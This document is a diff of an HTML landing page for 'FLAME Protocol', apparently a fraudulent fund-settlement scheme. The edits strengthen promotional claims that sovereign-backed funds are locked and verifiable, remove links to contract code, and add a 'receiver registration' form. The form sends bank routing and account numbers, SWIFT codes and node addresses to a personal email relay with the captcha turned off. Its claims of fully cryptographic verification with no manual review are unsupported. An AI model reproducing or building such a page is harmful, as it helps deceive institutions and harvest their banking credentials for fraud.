+Treasury: 0x90206A9888E3963c22f6AD1c79245b6250CFc016<br>
+Call: verifySettlement(merkle_uid) → returns: { locked: true, amount: 10000 }
+                        </div>
+                        <div class="step-result">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
+                            Funds confirmed locked in Treasury
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="validate-step">
+                    <div class="step-marker">3</div>
+                    <div class="step-content">
+                        <h4>Validate Four Pillars</h4>
+                        <p>
+                            Run the Merkle proof verification to confirm chain of title, clean funds, 
+                            asset backing, and liquidity. All cryptographic—no manual review needed.
+                        </p>
+                        <div class="step-code">
+const result = await flameVerifier.validatePillars(merkle_uid);<br>
+// { chain_of_title: "VALID", clean_funds: "CERTIFIED", backing: "CONFIRMED", liquidity: "AVAILABLE" }
+                        </div>
+                        <div class="step-result">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
+                            All four pillars validated
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="validate-step">
+                    <div class="step-marker">4</div>
+                    <div class="step-content">
+                        <h4>Acknowledge Receipt</h4>
+                        <p>
+                            Send acknowledgment back to FLAME Protocol. This triggers the actual fund 
+                            movement through your designated rail (ACH, SWIFT, or crypto).
+                        </p>
+                        <div class="step-code">
+POST https://api.flame.protocol/v1/settlement/acknowledge<br>
+{ "merkle_uid": "0x7a5c8b3d...", "receiver_node": "your-node-id", "rail": "ACH" }
+                        </div>
+                        <div class="step-result">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
+                            Settlement complete — funds are YOURS
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 48px; padding: 32px; background: var(--slate-100); border-radius: 16px;">
+                <p style="font-size: 1.25rem; color: var(--navy-900); margin-bottom: 8px;">
+                    <strong>Total "Release Procedure":</strong>
+                </p>
+                <p style="font-size: 2rem; color: var(--success); font-weight: 700; font-family: var(--font-display);">
+                    4 API calls. Zero manual steps.
+                </p>
+                <p style="color: var(--slate-500); margin-top: 16px;">
+                    The same process you'd use to verify any cryptocurrency transaction.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contracts Section -->
     <section id="contracts" class="contracts">
         <div class="container">
             <div class="section-header">
                 <h2 class="section-label">Ethereum Mainnet</h2>
                 <h3 class="section-title" style="color: var(--white);">Verify Everything On-Chain</h3>
                 <p class="section-subtitle" style="color: var(--slate-400);">
-                    All FLAME Protocol contracts are deployed to Ethereum mainnet. 
-                    Click any link to verify directly on Etherscan.
+                    Don't trust us—verify. All FLAME contracts are on Ethereum mainnet. 
+                    Click to see the locked funds yourself.
                 </p>
             </div>
             
             <div class="contracts-grid">
-                <!-- Treasury Contract -->
                 <div class="contract-card">
                     <div class="contract-header">
                         <span class="contract-name">Treasury Vault</span>
@@ -382,53 +581,20 @@ a { transition: all 0.2s ease; }
                     </div>
                     <div class="contract-address">0x90206A9888E3963c22f6AD1c79245b6250CFc016</div>
                     <p class="contract-description">
-                        Primary treasury holding sovereign-backed assets. Controls fund releases 
-                        and settlement execution across all rails.
+                        Where the funds are locked before settlement. Verify balances and locked amounts directly.
                     </p>
                     <div class="contract-links">
                         <a href="https://etherscan.io/address/0x90206A9888E3963c22f6AD1c79245b6250CFc016" target="_blank" rel="noopener" class="contract-link">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
                             Etherscan
                         </a>
-                        <a href="https://etherscan.io/address/0x90206A9888E3963c22f6AD1c79245b6250CFc016#code" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-                            View Code
-                        </a>
-                        <a href="https://etherscan.io/address/0x90206A9888E3963c22f6AD1c79245b6250CFc016#internaltx" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-                            Transactions
+                        <a href="https://etherscan.io/address/0x90206A9888E3963c22f6AD1c79245b6250CFc016#readContract" target="_blank" rel="noopener" class="contract-link">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01"/></svg>
+                            Check Balances
                         </a>
                     </div>
                 </div>
 
-                <!-- Registry Contract -->
-                <div class="contract-card">
-                    <div class="contract-header">
-                        <span class="contract-name">Identity Registry</span>
-                        <span class="contract-badge">Verified</span>
-                    </div>
-                    <div class="contract-address">0x67CFB9bFC401fdf4F15F38E821df55787fDe236f</div>
-                    <p class="contract-description">
-                        Sovereign identity registry managing authorized participants, 
-                        institutional credentials, and chain-of-title records.
-                    </p>
-                    <div class="contract-links">
-                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
-                            Etherscan
-                        </a>
-                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f#code" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-                            View Code
-                        </a>
-                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f#events" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
-                            Events
-                        </a>
-                    </div>
-                </div>
-
-                <!-- P-Verifier Contract -->
                 <div class="contract-card">
                     <div class="contract-header">
                         <span class="contract-name">P-Verifier</span>
@@ -436,26 +602,41 @@ a { transition: all 0.2s ease; }
                     </div>
                     <div class="contract-address">0x6cA24fe8e6550bc2B2A6E56F78855061768Bc4c7</div>
                     <p class="contract-description">
-                        Proof verification system validating Merkle proofs, signatures, 
-                        and deterministic UID derivations on-chain.
+                        Validates Merkle proofs and settlement attestations. Call verifyProof() with any UID.
                     </p>
                     <div class="contract-links">
                         <a href="https://etherscan.io/address/0x6cA24fe8e6550bc2B2A6E56F78855061768Bc4c7" target="_blank" rel="noopener" class="contract-link">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
                             Etherscan
                         </a>
-                        <a href="https://etherscan.io/address/0x6cA24fe8e6550bc2B2A6E56F78855061768Bc4c7#code" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-                            View Code
-                        </a>
                         <a href="https://etherscan.io/address/0x6cA24fe8e6550bc2B2A6E56F78855061768Bc4c7#readContract" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01"/></svg>
-                            Read Contract
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                            Verify Proof
                         </a>
                     </div>
                 </div>
 
-                <!-- AEON Core Contract -->
+                <div class="contract-card">
+                    <div class="contract-header">
+                        <span class="contract-name">Identity Registry</span>
+                        <span class="contract-badge">Verified</span>
+                    </div>
+                    <div class="contract-address">0x67CFB9bFC401fdf4F15F38E821df55787fDe236f</div>
+                    <p class="contract-description">
+                        Authorized receivers and institutional credentials. Your node will be registered here.
+                    </p>
+                    <div class="contract-links">
+                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f" target="_blank" rel="noopener" class="contract-link">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
+                            Etherscan
+                        </a>
+                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f#events" target="_blank" rel="noopener" class="contract-link">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                            View Registry
+                        </a>
+                    </div>
+                </div>
+
                 <div class="contract-card">
                     <div class="contract-header">
                         <span class="contract-name">AEON Core Token</span>
@@ -463,17 +644,12 @@ a { transition: all 0.2s ease; }
                     </div>
                     <div class="contract-address">0x600D6c7BFD61a245F33B9AEbc634A876E1caFDC0</div>
                     <p class="contract-description">
-                        Core settlement token representing verified sovereign claims. 
-                        Immutable backing with constitutional enforcement.
+                        Settlement token with constitutional backing. View token info and holder distribution.
                     </p>
                     <div class="contract-links">
                         <a href="https://etherscan.io/address/0x600D6c7BFD61a245F33B9AEbc634A876E1caFDC0" target="_blank" rel="noopener" class="contract-link">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
                             Etherscan
-                        </a>
-                        <a href="https://etherscan.io/address/0x600D6c7BFD61a245F33B9AEbc634A876E1caFDC0#code" target="_blank" rel="noopener" class="contract-link">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-                            View Code
                         </a>
                         <a href="https://etherscan.io/token/0x600D6c7BFD61a245F33B9AEbc634A876E1caFDC0" target="_blank" rel="noopener" class="contract-link">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
@@ -482,346 +658,189 @@ a { transition: all 0.2s ease; }
                     </div>
                 </div>
             </div>
-            
-            <div style="text-align: center; margin-top: 48px;">
-                <p style="color: var(--slate-400); margin-bottom: 24px;">
-                    All contracts verified and open source. Independent audits available upon request.
-                </p>
-                <a href="https://etherscan.io/accounts/label/flame-protocol" target="_blank" rel="noopener" class="btn btn-outline">
-                    View All FLAME Contracts on Etherscan
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
-                </a>
-            </div>
         </div>
     </section>
 
-    <!-- Problem Section -->
-    <section class="problem">
+    <!-- Receiver Registration Form -->
+    <section id="register" class="register">
         <div class="container">
-            <div class="problem-content">
-                <h2 class="section-label">The Challenge</h2>
-                <h3 class="problem-title">
-                    Traditional fund verification relies on trust.<br>
-                    <span class="text-muted">FLAME relies on mathematics.</span>
-                </h3>
-                <p class="problem-text">
-                    Current banking infrastructure requires multiple intermediaries, 
-                    manual attestations, and probabilistic assessments to verify fund 
-                    legitimacy. This creates delays, costs, and—critically—uncertainty.
-                </p>
-            </div>
-            <div class="problem-comparison">
-                <div class="comparison-card traditional">
-                    <h4>Traditional Verification</h4>
-                    <ul>
-                        <li><svg class="icon-x" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>Manual document review</li>
-                        <li><svg class="icon-x" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>Multiple intermediary attestations</li>
-                        <li><svg class="icon-x" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>3-5 day settlement windows</li>
-                        <li><svg class="icon-x" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>Trust-based provenance</li>
-                        <li><svg class="icon-x" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>Audit reconstruction required</li>
-                    </ul>
-                </div>
-                <div class="comparison-card flame">
-                    <div class="flame-badge">FLAME Protocol</div>
-                    <h4>Cryptographic Verification</h4>
-                    <ul>
-                        <li><svg class="icon-check" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>Deterministic proof generation</li>
-                        <li><svg class="icon-check" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>Single-source Merkle verification</li>
-                        <li><svg class="icon-check" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>Atomic settlement execution</li>
-                        <li><svg class="icon-check" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>Mathematical provenance chain</li>
-                        <li><svg class="icon-check" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>Immutable audit trail built-in</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Verification Pillars -->
-    <section id="verification" class="pillars">
-        <div class="container">
-            <div class="section-header">
-                <h2 class="section-label">Verification Framework</h2>
-                <h3 class="section-title">Four Pillars of Fund Integrity</h3>
-                <p class="section-subtitle">
-                    Every transaction is validated across four independent dimensions, 
-                    each producing cryptographic proof verifiable on Ethereum mainnet.
-                </p>
-            </div>
-            
-            <div class="pillars-grid">
-                <div class="pillar-card">
-                    <div class="pillar-number">01</div>
-                    <div class="pillar-icon">
-                        <svg viewBox="0 0 48 48" fill="none">
-                            <path d="M24 4L4 14v20l20 10 20-10V14L24 4z" stroke="currentColor" stroke-width="2"/>
-                            <path d="M4 14l20 10 20-10M24 24v20" stroke="currentColor" stroke-width="2"/>
-                            <circle cx="24" cy="14" r="4" fill="currentColor"/>
-                        </svg>
-                    </div>
-                    <h4 class="pillar-title">Chain of Title</h4>
-                    <p class="pillar-description">
-                        Complete ownership history from origination to present, cryptographically 
-                        linked via Merkle tree. Every transfer recorded on-chain.
-                    </p>
-                    <div class="pillar-details">
-                        <h5>What Banks Verify:</h5>
-                        <ul>
-                            <li>Unbroken ownership chain from source</li>
-                            <li>All transfers authenticated on mainnet</li>
-                            <li>No competing claims or encumbrances</li>
-                            <li>Constitutional authority of originator</li>
-                        </ul>
-                    </div>
-                    <div class="pillar-proof">
-                        <span class="proof-label">Proof:</span>
-                        <code>MERKLE_INCLUSION</code>
-                    </div>
-                </div>
-
-                <div class="pillar-card">
-                    <div class="pillar-number">02</div>
-                    <div class="pillar-icon">
-                        <svg viewBox="0 0 48 48" fill="none">
-                            <rect x="6" y="12" width="36" height="24" rx="2" stroke="currentColor" stroke-width="2"/>
-                            <path d="M6 20h36" stroke="currentColor" stroke-width="2"/>
-                            <circle cx="24" cy="28" r="4" stroke="currentColor" stroke-width="2"/>
-                        </svg>
-                    </div>
-                    <h4 class="pillar-title">Clean Funds Certification</h4>
-                    <p class="pillar-description">
-                        AML/KYC compliance with cryptographic attestation. Source of wealth 
-                        documented and anchored to immutable compliance records.
-                    </p>
-                    <div class="pillar-details">
-                        <h5>What Banks Verify:</h5>
-                        <ul>
-                            <li>AML screening completed and passed</li>
-                            <li>Source of funds documented on-chain</li>
-                            <li>No sanctions list matches</li>
-                            <li>Compliance attestation signed</li>
-                        </ul>
-                    </div>
-                    <div class="pillar-proof">
-                        <span class="proof-label">Proof:</span>
-                        <code>COMPLIANCE_ATTESTATION</code>
-                    </div>
-                </div>
-
-                <div class="pillar-card">
-                    <div class="pillar-number">03</div>
-                    <div class="pillar-icon">
-                        <svg viewBox="0 0 48 48" fill="none">
-                            <path d="M24 4l-4 8h8l-4-8z" fill="currentColor"/>
-                            <rect x="12" y="16" width="24" height="20" rx="2" stroke="currentColor" stroke-width="2"/>
-                            <path d="M12 24h24M20 24v12M28 24v12" stroke="currentColor" stroke-width="2"/>
-                        </svg>
-                    </div>
-                    <h4 class="pillar-title">Asset Backing Verification</h4>
-                    <p class="pillar-description">
-                        Physical and digital assets verified through vault attestations, 
-                        custody proofs, and lien magnitude calculations anchored to mainnet.
-                    </p>
-                    <div class="pillar-details">
-                        <h5>What Banks Verify:</h5>
-                        <ul>
-                            <li>Backing instrument identified on-chain</li>
-                            <li>Custody proof from authorized vault</li>
-                            <li>Lien magnitude vs. transaction value</li>
-                            <li>No prior encumbrances on collateral</li>
-                        </ul>
-                    </div>
-                    <div class="pillar-proof">
-                        <span class="proof-label">Proof:</span>
-                        <code>VAULT_ATTESTATION</code>
-                    </div>
-                </div>
-
-                <div class="pillar-card">
-                    <div class="pillar-number">04</div>
-                    <div class="pillar-icon">
-                        <svg viewBox="0 0 48 48" fill="none">
-                            <path d="M24 4c-8 8-16 14-16 24a16 16 0 1032 0c0-10-8-16-16-24z" stroke="currentColor" stroke-width="2"/>
-                            <path d="M24 36c-4.4 0-8-3.6-8-8 0-5 8-12 8-12s8 7 8 12c0 4.4-3.6 8-8 8z" fill="currentColor" opacity="0.3"/>
-                        </svg>
-                    </div>
-                    <h4 class="pillar-title">Liquidity Availability</h4>
-                    <p class="pillar-description">
-                        Real-time verification that funds are available for immediate settlement 
-                        across all rails: ACH, SWIFT, ISO20022, ETH, USDT, USDC, BTC.
-                    </p>
-                    <div class="pillar-details">
-                        <h5>What Banks Verify:</h5>
-                        <ul>
-                            <li>Funds not locked or committed elsewhere</li>
-                            <li>Settlement rail availability confirmed</li>
-                            <li>Atomic execution guarantee</li>
-                            <li>No pending claims or holds</li>
-                        </ul>
-                    </div>
-                    <div class="pillar-proof">
-                        <span class="proof-label">Proof:</span>
-                        <code>LIQUIDITY_COMMITMENT</code>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Determinism Section -->
-    <section id="determinism" class="determinism">
-        <div class="container">
-            <div class="determinism-content">
-                <h2 class="section-label">Why Determinism Matters</h2>
-                <h3 class="determinism-title">
-                    Same Inputs. Same Outputs.<br>
-                    <span class="text-gold">Every Time. Forever.</span>
-                </h3>
-                <p class="determinism-text">
-                    Traditional systems produce different results based on timing, server state, 
-                    or intermediary decisions. FLAME Protocol guarantees that verification 
-                    performed today will produce <em>identical results</em> when re-verified 
-                    in 100 years—because mathematics doesn't change.
-                </p>
-                
-                <div class="determinism-diagram">
-                    <div class="diagram-input">
-                        <span class="diagram-label">Input</span>
-                        <div class="diagram-box">
-                            <code>master_root</code>
-                            <code>lineage_root</code>
-                            <code>index: 42</code>
-                        </div>
-                    </div>
-                    <div class="diagram-arrow">
-                        <svg viewBox="0 0 100 24">
-                            <path d="M0 12h90M80 4l12 8-12 8" stroke="currentColor" stroke-width="2" fill="none"/>
-                        </svg>
-                        <span>SHA3-256</span>
-                    </div>
-                    <div class="diagram-output">
-                        <span class="diagram-label">Output (Always)</span>
-                        <div class="diagram-box gold">
-                            <code>0x7a5c8b3d...</code>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="determinism-benefits">
-                    <div class="benefit">
-                        <h5>Audit Certainty</h5>
-                        <p>Recreate any verification at any time with mathematical precision.</p>
-                    </div>
-                    <div class="benefit">
-                        <h5>Regulatory Proof</h5>
-                        <p>Demonstrate compliance with cryptographic evidence, not attestations.</p>
-                    </div>
-                    <div class="benefit">
-                        <h5>Dispute Resolution</h5>
-                        <p>Resolve conflicts with provable, immutable transaction history.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Request Access Section -->
-    <section id="download" class="download">
-        <div class="container">
-            <div class="download-card">
-                <div class="download-content">
-                    <h2 class="section-label">Get Started</h2>
-                    <h3 class="download-title">Request API Access</h3>
-                    <p class="download-text">
-                        Submit your request for institutional access to FLAME Protocol. 
-                        Your package will include API credentials, documentation, 
-                        code samples, and direct support.
+            <div class="register-card">
+                <div class="register-content">
+                    <h2 class="section-label">Become a Receiver</h2>
+                    <h3 class="register-title">Register Your Institution</h3>
+                    <p class="register-text">
+                        Provide your API endpoint or IP node address to receive FLAME settlements. 
+                        Once registered, you can receive liquid funds through any supported rail—
+                        ACH, SWIFT, ISO20022, or direct crypto transfer.
                     </p>
                     
-                    <div class="package-contents">
-                        <h4>What You'll Receive:</h4>
-                        <div class="contents-grid">
-                            <div class="content-item">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
-                                <span>API Credentials &amp; Keys</span>
-                            </div>
-                            <div class="content-item">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
-                                <span>Technical Documentation</span>
-                            </div>
-                            <div class="content-item">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-                                <span>Code Samples (Python, Node, Rust)</span>
-                            </div>
-                            <div class="content-item">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                                <span>Security &amp; Compliance Guide</span>
-                            </div>
-                            <div class="content-item">
+                    <div class="what-we-need">
+                        <h4>What We Need From You:</h4>
+                        
+                        <div class="need-item">
+                            <div class="need-icon">
                                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                                <span>FLAME Core Binary (Optional)</span>
                             </div>
-                            <div class="content-item">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
-                                <span>Dedicated Integration Support</span>
+                            <div class="need-text">
+                                <h5>API Endpoint or IP Node Address</h5>
+                                <p>Your receiving endpoint where settlement packages will be sent. Can be REST API, webhook URL, or static IP.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="need-item">
+                            <div class="need-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
+                            </div>
+                            <div class="need-text">
+                                <h5>Banking Details (for ACH/SWIFT)</h5>
+                                <p>Routing number, account number, SWIFT/BIC code for traditional rail settlements.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="need-item">
+                            <div class="need-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                            </div>
+                            <div class="need-text">
+                                <h5>Crypto Addresses (Optional)</h5>
+                                <p>ETH, USDT, USDC addresses if you want to receive via blockchain rail.</p>
                             </div>
                         </div>
                     </div>
                 </div>
                 
-                <div class="download-form">
-                    <form id="access-form" action="https://formsubmit.co/yolewis@c-yess.org" method="POST">
+                <div class="register-form">
+                    <form id="receiver-form" action="https://formsubmit.co/yolewis@c-yess.org" method="POST">
                         <!-- FormSubmit Configuration -->
-                        <input type="hidden" name="_subject" value="FLAME Protocol API Access Request">
+                        <input type="hidden" name="_subject" value="🔥 NEW FLAME RECEIVER REGISTRATION">
                         <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="_template" value="table">
-                        <input type="hidden" name="_next" value="https://flame.protocol/thank-you">
+                        
+                        <!-- Institution Information -->
+                        <div class="form-section-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"/></svg>
+                            Institution Information
+                        </div>
                         
                         <div class="form-group">
-                            <label for="institution">Institution Name *</label>
-                            <input type="text" id="institution" name="Institution" required placeholder="First National Bank">
+                            <label for="institution">Institution Name <span class="required">*</span></label>
+                            <input type="text" id="institution" name="Institution_Name" required placeholder="First National Bank">
                         </div>
-                        <div class="form-group">
-                            <label for="name">Your Name *</label>
-                            <input type="text" id="name" name="Name" required placeholder="Jane Smith">
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="contact-name">Contact Name <span class="required">*</span></label>
+                                <input type="text" id="contact-name" name="Contact_Name" required placeholder="Jane Smith">
+                            </div>
+                            <div class="form-group">
+                                <label for="contact-title">Title</label>
+                                <input type="text" id="contact-title" name="Contact_Title" placeholder="VP Treasury Operations">
+                            </div>
                         </div>
-                        <div class="form-group">
-                            <label for="title">Title / Role *</label>
-                            <input type="text" id="title" name="Title" required placeholder="VP Treasury Operations">
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="email">Email <span class="required">*</span></label>
+                                <input type="email" id="email" name="Email" required placeholder="jane.smith@bank.example">
+                            </div>
+                            <div class="form-group">
+                                <label for="phone">Phone</label>
+                                <input type="tel" id="phone" name="Phone" placeholder="+1 (555) 123-4567">
+                            </div>
                         </div>
-                        <div class="form-group">
-                            <label for="email">Work Email *</label>
-                            <input type="email" id="email" name="Email" required placeholder="jane.smith@bank.example">
+                        
+                        <!-- Technical Endpoint -->
+                        <div class="form-section-title" style="margin-top: 32px;">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                            API / Node Information
                         </div>
+                        
                         <div class="form-group">
-                            <label for="phone">Phone</label>
-                            <input type="tel" id="phone" name="Phone" placeholder="+1 (555) 123-4567">
+                            <label for="api-endpoint">API Endpoint or IP Node Address <span class="required">*</span></label>
+                            <input type="text" id="api-endpoint" name="API_Endpoint" required placeholder="https://api.yourbank.com/flame/receive or 192.168.1.100:8080">
+                            <div class="form-hint">This is where we'll send settlement packages. Can be URL or IP:Port</div>
                         </div>
+                        
                         <div class="form-group">
-                            <label for="use-case">Primary Use Case *</label>
-                            <select id="use-case" name="Use_Case" required>
-                                <option value="">Select primary use case...</option>
-                                <option value="Fund Verification">Incoming Fund Verification</option>
-                                <option value="Settlement Processing">Settlement Processing</option>
-                                <option value="Compliance Automation">Compliance Automation</option>
-                                <option value="Audit Trail">Audit Trail Generation</option>
-                                <option value="API Integration">API / Node Integration</option>
-                                <option value="Technical Evaluation">Technical Evaluation</option>
-                                <option value="Other">Other</option>
+                            <label for="node-id">Preferred Node ID</label>
+                            <input type="text" id="node-id" name="Preferred_Node_ID" placeholder="FNB-TREASURY-01">
+                            <div class="form-hint">Your chosen identifier in the FLAME network (we'll assign one if blank)</div>
+                        </div>
+                        
+                        <!-- Banking Details -->
+                        <div class="form-section-title" style="margin-top: 32px;">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                            Banking Details (for ACH/SWIFT)
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="routing">Routing Number (ABA)</label>
+                                <input type="text" id="routing" name="Routing_Number" placeholder="021000021">
+                            </div>
+                            <div class="form-group">
+                                <label for="account">Account Number</label>
+                                <input type="text" id="account" name="Account_Number" placeholder="123456789">
+                            </div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="swift">SWIFT/BIC Code</label>
+                                <input type="text" id="swift" name="SWIFT_BIC" placeholder="FNBBUS33XXX">
+                            </div>
+                            <div class="form-group">
+                                <label for="bank-name">Bank Name</label>
+                                <input type="text" id="bank-name" name="Bank_Name" placeholder="First National Bank">
+                            </div>
+                        </div>
+                        
+                        <!-- Crypto Addresses -->
+                        <div class="form-section-title" style="margin-top: 32px;">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                            Crypto Addresses (Optional)
+                        </div>
+                        
+                        <div class="form-group">
